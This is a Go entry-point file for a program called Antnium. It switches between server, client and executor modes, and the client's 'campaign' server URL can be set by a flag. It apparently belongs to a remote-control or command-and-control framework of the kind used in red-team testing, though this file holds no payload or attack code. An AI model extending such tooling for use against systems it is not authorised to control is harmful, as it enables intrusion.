package main

import (
	"flag"
	"fmt"

	"github.com/dobin/antnium/client"
	"github.com/dobin/antnium/executor"
	"github.com/dobin/antnium/server"
)

func main() {
	flagServer := flag.Bool("server", false, "IsServer")
	flagServerAddr := flag.String("serveraddr", "127.0.0.1:4444", "Server listen address")

	flagClient := flag.Bool("client", false, "IsClient")
	flagClientAddr := flag.String("clientaddr", "", "Server URL for the client")

	executorClient := flag.Bool("executorClient", false, "ExecutorClient")

	flag.Parse()

	fmt.Println("Antnium 0.1")

	if *flagServer {
		s := server.NewServer(*flagServerAddr)
		s.Serve()
	} else if *flagClient {
		c := client.NewClient()

		// Overwrite our server url
		if *flagClientAddr != "" {
			c.Campaign.ServerUrl = *flagClientAddr
		}
		c.Start()
	} else if *executorClient {
		executor.StartClient()
	}
}
